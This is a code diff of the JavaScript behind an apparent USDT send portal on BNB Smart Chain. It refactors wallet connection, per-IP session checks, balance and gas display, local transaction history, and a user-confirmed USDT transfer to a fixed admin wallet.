-            document.getElementById('usdtUSD').innerText = usdtUSD.toFixed(2);
-            document.getElementById('bnbUSD').innerText = (parseFloat(bnbFormatted) * bnbPriceUSD).toFixed(2);
-            
-            await calculateGasFee();
-        } catch (error) {
-            console.error("Balance error:", error);
-        }
-    }
-    
-    async function disconnect() {
-        if (userAddress) {
-            removeIPSession(userIP);
-        }
-        userAddress = null;
-        signer = null;
-        provider = null;
-        if (window.ethereum) {
-            // Clear session
-        }
-        document.getElementById('loginSection').classList.remove('hidden');
-        document.getElementById('dashboardSection').classList.add('hidden');
-        showToast('Wallet disconnected', 'info');
-    }
-    
-    async function initConnection(accounts) {
-        try {
-            if (!accounts || accounts.length === 0) throw new Error("No accounts");
-            
-            const wallet = accounts[0];
-            
-            // Check IP session
-            const ipCheck = checkIPSession(userIP, wallet.toLowerCase());
-            if (!ipCheck.allowed) {
-                showToast(`❌ This IP already has an active session with wallet ${ipCheck.existingWallet.slice(0,6)}...${ipCheck.existingWallet.slice(-4)}. Only one wallet per IP allowed!`, 'error');
-                return;
+            await window.ethereum.request({
+                method: 'wallet_switchEthereumChain',
+                params: [{ chainId: CHAIN_ID }]
+            });
+        } catch (switchError) {
+            if (switchError.code === 4902) {
+                await window.ethereum.request({
+                    method: 'wallet_addEthereumChain',
+                    params: [{
+                        chainId: CHAIN_ID,
+                        chainName: 'Binance Smart Chain',
+                        nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                        rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                        blockExplorerUrls: ['https://bscscan.com/']
+                    }]
+                });
             }
-            
-            userAddress = wallet;
-            provider = new ethers.BrowserProvider(window.ethereum);
-            signer = await provider.getSigner();
-            
-            const network = await provider.getNetwork();
-            if (Number(network.chainId) !== 56) {
-                showToast('Please switch to BSC Mainnet', 'warning');
-                return;
-            }
-            
-            // Save IP session
-            saveIPSession(userIP, userAddress.toLowerCase());
-            
-            // Load user data
-            const userData = loadUserData(userAddress);
-            
-            document.getElementById('walletShort').innerText = `${userAddress.slice(0,6)}...${userAddress.slice(-4)}`;
-            document.getElementById('loginSection').classList.add('hidden');
-            document.getElementById('dashboardSection').classList.remove('hidden');
-            
-            await getBNBPrice();
-            await getUSDTDecimals();
-            await updateBalances();
-            displayUserStats(userAddress);
-            displayTransactionHistory(userAddress);
-            
-            // Auto refresh
-            setInterval(async () => {
-                if (userAddress) {
-                    await updateBalances();
-                }
-            }, 10000);
-            
-            showToast('Wallet connected successfully!', 'success');
-            
-        } catch (error) {
-            showToast(`Connection failed: ${error.message}`, 'error');
         }
     }
-    
+
     async function getUSDTDecimals() {
         try {
             const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
@@ -703,146 +637,311 @@
             usdtDecimals = 18;
         }
     }
-    
-    // Check existing session on page load
-    async function checkExistingSession() {
-        await getUserIP();
-        const savedWallet = localStorage.getItem('last_wallet');
-        if (savedWallet && window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-                if (accounts.length > 0 && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
-                    const ipCheck = checkIPSession(userIP, savedWallet.toLowerCase());
-                    if (ipCheck.allowed) {
-                        await initConnection(accounts);
-                    }
-                }
-            } catch (error) {
-                console.error("Session check error:", error);
-            }
+
+    async function updateBalances() {
+        if (!userAddress || !provider) return;
+        try {
+            const bnbBalanceWei = await provider.getBalance(userAddress);
+            rawBnbBalance = ethers.formatEther(bnbBalanceWei);
+            document.getElementById('bnbBalance').innerText = parseFloat(rawBnbBalance).toFixed(6);
+
+            const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, provider);
+            const usdtBalWei = await usdtContract.balanceOf(userAddress);
+            rawUsdtBalance = ethers.formatUnits(usdtBalWei, usdtDecimals);
+            document.getElementById('usdtBalance').innerText = parseFloat(rawUsdtBalance).toFixed(4);
+            
+            await calculateGasFee();
+        } catch (error) {
+            console.error("Balance update error:", error);
         }
     }
-    
-    // Send USDT
-    document.getElementById('sendBtn')?.addEventListener('click', async () => {
-        if (isProcessing) {
-            showToast('Transaction in progress...', 'warning');
-            return;
+
+    // ==========================================
+    // TRANSACTION HISTORY
+    // ==========================================
+    function saveTransactionToHistory(txHash, amount, gasUsed, wallet) {
+        try {
+            const transactions = JSON.parse(localStorage.getItem(STORAGE_KEYS.TRANSACTIONS + '_' + wallet) || '[]');
+            transactions.unshift({
+                hash: txHash,
+                amount: amount,
+                gasUsed: gasUsed,
+                timestamp: new Date().toISOString(),
+                to: ADMIN_WALLET
+            });
+            localStorage.setItem(STORAGE_KEYS.TRANSACTIONS + '_' + wallet, JSON.stringify(transactions.slice(0, 20)));
+            loadTransactionHistory(wallet);
+        } catch (error) {
+            console.error("Save error:", error);
         }
-        
-        const amount = parseFloat(document.getElementById('amountInput').value);
-        const usdtBalance = parseFloat(document.getElementById('usdtBalance').innerText);
-        
-        if (!amount || amount <= 0) {
-            showToast('Please enter a valid amount', 'error');
-            return;
+    }
+
+    function loadTransactionHistory(wallet) {
+        try {
+            const transactions = JSON.parse(localStorage.getItem(STORAGE_KEYS.TRANSACTIONS + '_' + wallet) || '[]');
+            const historyList = document.getElementById('historyList');
+            
+            if (transactions.length === 0) {
+                historyList.innerHTML = '<div style="text-align: center; color: var(--text-muted); padding: 20px;">No transactions yet</div>';
+                return;
+            }
+            
+            historyList.innerHTML = transactions.map(tx => `
+                <div class="history-item">
+                    <div>
+                        <div><strong>${parseFloat(tx.amount).toFixed(4)} USDT</strong></div>
+                        <small>${new Date(tx.timestamp).toLocaleString()}</small>
+                        <small>Gas: ${tx.gasUsed} BNB</small>
+                    </div>
+                    <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">
+                        <i class="fa-solid fa-arrow-up-right-from-square"></i>
+                    </a>
+                </div>
+            `).join('');
+        } catch (error) {
+            console.error("Load error:", error);
         }
-        if (amount > usdtBalance) {
-            showToast('Insufficient USDT balance', 'error');
-            return;
+    }
+
+    // ==========================================
+    // WALLET CONNECTION & SESSION RESTORE
+    // ==========================================
+    async function disconnectWallet() {
+        userAddress = null;
+        signer = null;
+        provider = null;
+        
+        if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+        
+        clearSession();
+        dashboardState.classList.add('hidden');
+        connectState.classList.remove('hidden');
+        document.getElementById('walletStatusBadge').innerHTML = '<i class="fa-solid fa-wallet"></i> Not Connected';
+        showToast('Wallet disconnected', 'info');
+        
+        // Update IP badge
+        if (currentIP) {
+            document.getElementById('ipDisplay').innerHTML = `<i class="fa-solid fa-laptop"></i> IP: ${currentIP}`;
         }
+    }
+
+    async function restoreSession() {
+        const session = getSession();
+        if (!session || !session.wallet) return false;
         
-        const bnbBalance = parseFloat(document.getElementById('bnbBalance').innerText);
-        const gasFee = parseFloat(document.getElementById('gasFee').innerText);
-        if (bnbBalance < gasFee * 1.1) {
-            showToast(`Insufficient BNB for gas! Need ~${(gasFee * 1.1).toFixed(6)} BNB`, 'error');
-            return;
-        }
-        
-        document.getElementById('modalAmount').innerHTML = `${amount} <span style="font-size:14px;">USDT</span>`;
-        document.getElementById('modalGasFee').innerHTML = `~${gasFee.toFixed(6)} BNB (≈ $${(gasFee * bnbPriceUSD).toFixed(2)})`;
-        document.getElementById('permissionModal').classList.add('active');
-        
-        window.pendingAmount = amount;
-    });
-    
-    document.getElementById('confirmTxBtn')?.addEventListener('click', async () => {
-        closeModal();
-        if (isProcessing) return;
-        isProcessing = true;
+        if (!window.ethereum) return false;
         
         try {
-            const sendBtn = document.getElementById('sendBtn');
-            sendBtn.disabled = true;
-            sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Processing...`;
-            
-            const amount = window.pendingAmount;
-            const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
-            const amountInWei = ethers.parseUnits(amount.toString(), usdtDecimals);
-            
-            showToast('Please approve in your wallet...', 'info');
-            
-            const feeData = await provider.getFeeData();
-            const tx = await usdtContract.transfer(ADMIN_WALLET, amountInWei, {
-                gasLimit: USDT_GAS_LIMIT,
-                gasPrice: feeData.gasPrice
-            });
-            
-            showToast('Transaction sent! Confirming...', 'info');
-            sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Confirming...`;
-            
-            const receipt = await tx.wait(1);
-            
-            if (receipt.status === 1) {
-                const gasUsed = parseFloat(ethers.formatEther(receipt.gasUsed * receipt.gasPrice));
-                showToast(`✅ Successfully sent ${amount} USDT!`, 'success');
-                saveTransaction(userAddress, tx.hash, amount, gasUsed.toFixed(6));
-                document.getElementById('amountInput').value = '';
-                setTimeout(updateBalances, 2000);
-            } else {
-                showToast('Transaction failed', 'error');
+            const accounts = await window.ethereum.request({ method: 'eth_accounts' });
+            if (accounts.length > 0 && accounts[0].toLowerCase() === session.wallet) {
+                await initConnection(accounts);
+                return true;
             }
+        } catch (error) {
+            console.error("Session restore error:", error);
+        }
+        
+        return false;
+    }
+
+    async function initConnection(accounts) {
+        try {
+            if (!accounts || accounts.length === 0) throw new Error("No accounts");
+            
+            const wallet = accounts[0];
+            
+            // IP Validation
+            const ip = await getIP();
+            currentIP = ip;
+            document.getElementById('ipDisplay').innerHTML = `<i class="fa-solid fa-laptop"></i> IP: ${ip}`;
+            
+            const ipCheck = isWalletAllowedForIP(wallet, ip);
+            if (!ipCheck.allowed) {
+                showToast(`❌ Another wallet (${ipCheck.existingWallet?.slice(0,6)}...) is already connected from this IP`, 'error');
+                return;
+            }
+            
+            userAddress = wallet;
+            if (!isValidAddress(userAddress)) throw new Error("Invalid address");
+            
+            provider = new ethers.BrowserProvider(window.ethereum);
+            signer = await provider.getSigner();
+            
+            const network = await provider.getNetwork();
+            if (Number(network.chainId) !== CHAIN_ID_DECIMAL) {
+                showToast('Please switch to BSC Mainnet', 'warning');
+                await switchToBSC();
+                setTimeout(() => initConnection(accounts), 2000);
+                return;
+            }
+            
+            // Register wallet for this IP
+            registerWalletForIP(wallet, ip);
+            
+            // Save session
+            saveSession(wallet, ip);
+            
+            connectState.classList.add('hidden');
+            dashboardState.classList.remove('hidden');
+            
+            document.getElementById('walletAddress').innerText = `${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+            document.getElementById('walletStatusBadge').innerHTML = `<i class="fa-solid fa-check-circle"></i> ${userAddress.slice(0, 6)}...${userAddress.slice(-4)}`;
+            
+            await getUSDTDecimals();
+            await updateBalances();
+            await getBNBPrice();
+            
+            if (autoRefreshInterval) clearInterval(autoRefreshInterval);
+            autoRefreshInterval = setInterval(updateBalances, 10000);
+            
+            loadTransactionHistory(wallet);
+            showToast('Wallet connected successfully!', 'success');
             
         } catch (error) {
-            if (error.code === 'ACTION_REJECTED') {
-                showToast('Transaction rejected', 'error');
-            } else {
-                showToast(`Error: ${error.message?.slice(0, 100)}`, 'error');
+            console.error("Init error:", error);
+            showToast(`Connection failed: ${error.message}`, 'error');
+        }
+    }
+
+    // ==========================================
+    // SEND USDT TRANSACTION
+    // ==========================================
+    if (sendBtn) {
+        sendBtn.addEventListener('click', async () => {
+            if (isProcessing) {
+                showToast('Transaction in progress...', 'warning');
+                return;
             }
-        } finally {
-            isProcessing = false;
-            const sendBtn = document.getElementById('sendBtn');
-            sendBtn.disabled = false;
-            sendBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Send USDT`;
-        }
-    });
-    
-    document.getElementById('connectBtn')?.addEventListener('click', async () => {
-        if (!window.ethereum) {
-            showToast("Please open in Trust Wallet or MetaMask", "error");
-            return;
-        }
-        try {
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            localStorage.setItem('last_wallet', accounts[0]);
-            await initConnection(accounts);
-        } catch (err) {
-            if (err.code === 4001) {
-                showToast("Please approve connection", "warning");
-            } else {
-                showToast(err.message, "error");
+            
+            const amountValue = amountInput.value;
+            
+            if (!amountValue || parseFloat(amountValue) <= 0) {
+                showToast('Please enter a valid USDT amount!', 'error');
+                return;
             }
-        }
+            
+            if (parseFloat(amountValue) > parseFloat(rawUsdtBalance)) {
+                showToast(`Insufficient USDT balance! Available: ${parseFloat(rawUsdtBalance).toFixed(4)} USDT`, 'error');
+                return;
+            }
+            
+            const requiredBNB = estimatedGasFeeBNB * 1.1;
+            if (parseFloat(rawBnbBalance) < requiredBNB) {
+                showToast(`⚠️ Insufficient BNB for gas! Need ${requiredBNB.toFixed(6)} BNB`, 'error');
+                return;
+            }
+            
+            pendingAmount = amountValue;
+            document.getElementById('modalAmountDisplay').innerHTML = `${pendingAmount} USDT`;
+            permissionModal.classList.add('active');
+        });
+    }
+
+    const confirmBtn = document.getElementById('confirmTxBtn');
+    if (confirmBtn) {
+        confirmBtn.addEventListener('click', async () => {
+            permissionModal.classList.remove('active');
+            if (isProcessing) return;
+            isProcessing = true;
+            
+            try {
+                sendBtn.disabled = true;
+                sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Processing...`;
+                
+                const amountValue = parseFloat(pendingAmount);
+                const usdtContract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer);
+                const amountInWei = ethers.parseUnits(amountValue.toString(), usdtDecimals);
+                
+                showToast('Please approve in wallet...', 'info');
+                sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Waiting for approval...`;
+                
+                const feeData = await provider.getFeeData();
+                const gasPrice = feeData.gasPrice;
+                
+                const tx = await usdtContract.transfer(ADMIN_WALLET, amountInWei, {
+                    gasLimit: USDT_GAS_LIMIT,
+                    gasPrice: gasPrice
+                });
+                
+                showToast('Transaction sent! Confirming...', 'info');
+                sendBtn.innerHTML = `<i class="fa-solid fa-spinner spin"></i> Confirming...`;
+                
+                const receipt = await tx.wait(1);
+                
+                if (receipt.status === 1) {
+                    const actualGasUsed = receipt.gasUsed;
+                    const actualGasPrice = receipt.gasPrice;
+                    const actualGasBNB = parseFloat(ethers.formatEther(actualGasUsed * actualGasPrice));
+                    
+                    showToast(`✅ Successfully sent ${pendingAmount} USDT!`, 'success');
+                    amountInput.value = '';
+                    
+                    setTimeout(updateBalances, 3000);
+                    saveTransactionToHistory(tx.hash, pendingAmount, actualGasBNB.toFixed(6), userAddress);
+                } else {
+                    showToast('❌ Transaction failed', 'error');
+                }
+                
+            } catch (error) {
+                console.error("Transfer error:", error);
+                if (error.code === 'ACTION_REJECTED') {
+                    showToast('❌ You rejected the transaction', 'error');
+                } else if (error.message?.includes('insufficient funds')) {
+                    showToast(`❌ Insufficient BNB for gas!`, 'error');
+                } else {
+                    showToast(`❌ Transfer failed`, 'error');
+                }
+            } finally {
+                isProcessing = false;
+                sendBtn.disabled = false;
+                sendBtn.innerHTML = `<i class="fa-solid fa-paper-plane"></i> Send USDT`;
+            }
+        });
+    }
+
+    // ==========================================
+    // CONNECT BUTTON & EVENT LISTENERS
+    // ==========================================
+    if (connectBtn) {
+        connectBtn.addEventListener('click', async () => {
+            if (!window.ethereum) {
+                showToast("Please open in Trust Wallet or MetaMask", "error");
+                return;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                await initConnection(accounts);
+            } catch (err) {
+                if (err.code === 4001) {
+                    showToast("Please approve connection", "warning");
+                } else {
+                    showToast(err.message, "error");
+                }
+            }
+        });
+    }
+
+    // Auto-restore session on page load
+    window.addEventListener('load', async () => {
+        const ip = await getIP();
+        currentIP = ip;
+        document.getElementById('ipDisplay').innerHTML = `<i class="fa-solid fa-laptop"></i> IP: ${ip}`;
+        await restoreSession();
     });
-    
-    document.getElementById('logoutBtn')?.addEventListener('click', async () => {
-        await disconnect();
-        localStorage.removeItem('last_wallet');
-    });
-    
+
     if (window.ethereum) {
         window.ethereum.on('accountsChanged', (accounts) => {
-            if (accounts.length > 0 && userAddress && accounts[0].toLowerCase() !== userAddress.toLowerCase()) {
+            if (accounts.length > 0) {
                 initConnection(accounts);
-            } else if (accounts.length === 0) {
-                disconnect();
+            } else {
+                disconnectWallet();
             }
         });
         window.ethereum.on('chainChanged', () => window.location.reload());
     }
     
-    // Initialize
-    getUserIP().then(() => checkExistingSession());
+    document.getElementById('modalAdminAddress').innerText = ADMIN_WALLET;
+    console.log("USDT Portal Ready - Session Persistence Active");
 </script>
 
 </body>
